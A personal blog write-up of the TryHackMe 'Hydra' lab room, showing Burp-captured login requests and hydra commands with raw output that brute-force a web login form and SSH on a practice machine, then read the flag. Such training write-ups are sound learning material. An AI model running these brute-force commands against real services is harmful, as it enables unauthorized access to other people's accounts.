---
title: "Hydra_writeup.sh"
date: 2020-08-26T14:43:42-04:00
draft: false
toc: false
cover: "img/hydra_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
---

# Hydra - THM Room 

This is a quick writeup or another "just-me-taking-notes" thing for Hydra TryhackMe's room. This is a pretty raw and quick writeup detailing my process to pawn this room.

Enjoy!

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/hydra).
- **PLEASE NOTE:** Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.
- Donwload Hydra by clicking [this](https://github.com/vanhauser-thc/thc-hydra) link.


[Task 1] Deploy and compromise the vulnerable machine! 
------------------------------------------------------


Ok we deploy the machine, we open the IP on the browser. We arrive to a login form:

![Login Form](https://i.imgur.com/hhYFnkP.png)

We need to intercept a login request, capture the error message and feed all that information to **hydra** to bruteforce our way in. In my case I used burp to capture the request and copied the login error message from the web itself:

```sh
POST /login HTTP/1.1
Host: 10.10.207.42
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.207.42
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.207.42/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=§s%3AuTOeTMubK4HkZh5O_fBmQyEs82mjMPad.kq4lhxSPBxkOXNiadO8R7w1mqmISpwvQv7Il8KJ1Hzg§
Connection: close

username=§test§&password=§test§
errorMessage: Your username or password is incorrect.
```


We need to construct a **POST** request attack with **hydra**. Lucky us, the room is quite good at providing an example as well as the target Username **molly**:

```sh
hydra -l <username> -P <wordlist> 10.10.207.42 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

- <username>: molly
- <Wordlist>: we'll use rockyou.txt
- <URL>: /login

Using the details from the request and the room we fire up our hydra attack:


```sh
┌──(kali㉿kali)-[~/Documents/THM/hydra]
└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.207.42 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect" -V
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-26 14:30:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.207.42:80/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "654321" - 17 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "michael" - 18 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "ashley" - 19 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "qwerty" - 20 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "111111" - 21 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "iloveu" - 22 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "000000" - 23 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "michelle" - 24 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "tigger" - 25 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "sunshine" - 26 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "chocolate" - 27 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "password1" - 28 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "soccer" - 29 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "anthony" - 30 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "friends" - 31 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "butterfly" - 32 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "purple" - 33 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "angel" - 34 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "jordan" - 35 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "liverpool" - 36 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "justin" - 37 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "loveme" - 38 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "fuckyou" - 39 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "123123" - 40 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "football" - 41 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "secret" - 42 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "andrea" - 43 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.207.42 - login "molly" - pass "carlos" - 44 of 14344399 [child 5] (0/0)
[80][http-post-form] host: 10.10.207.42   login: molly   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-26 14:30:38

```

With that we obtained Molly's password, if we login into that web login form we'll get our first flag:

![First Flag](https://i.imgur.com/Z9XtHj7.png)

THM{REDACTED_FIRST_FLAG}

Now we need to use hydra again, but this time to Bruteforce Molly's SSH access:

We see a sample attack is like follows:

```sh
hydra -l root -P passwords.txt -t 32 <IP> ssh
```

So we model our second attack following that example and execute it:

```sh

┌──(kali㉿kali)-[~/Documents/THM/hydra]
└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt -t 32 10.10.207.42 ssh                                                                               1 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-26 14:39:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344399 login tries (l:1/p:14344399), ~448263 tries per task
[DATA] attacking ssh://10.10.207.42:22/
[22][ssh] host: 10.10.207.42   login: molly   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 13 final worker threads did not complete until end.
[ERROR] 13 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-26 14:39:35

```

We got Molly's SSH credentials now. Time to look for the last flag:

```sh
┌──(kali㉿kali)-[~/Documents/THM/hydra]
└─$ ssh molly@10.10.207.42                                                                                                                                255 ⨯
The authenticity of host '10.10.207.42 (10.10.207.42)' can't be established.
ECDSA key fingerprint is SHA256:1+x45urBtNteGs0xMVwPnfDikwOijzmb/LA9/vabra0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.207.42' (ECDSA) to the list of known hosts.
molly@10.10.207.42's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
32 updates are security updates.


Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
molly@ip-10-10-207-42:~$ ls
flag2.txt
molly@ip-10-10-207-42:~$ cat flag2.txt
THM{SECOND_FLAG_REDACTED}
```
That's all there is to it.


As usual, happy hacking.

{{< thm_badge >}}
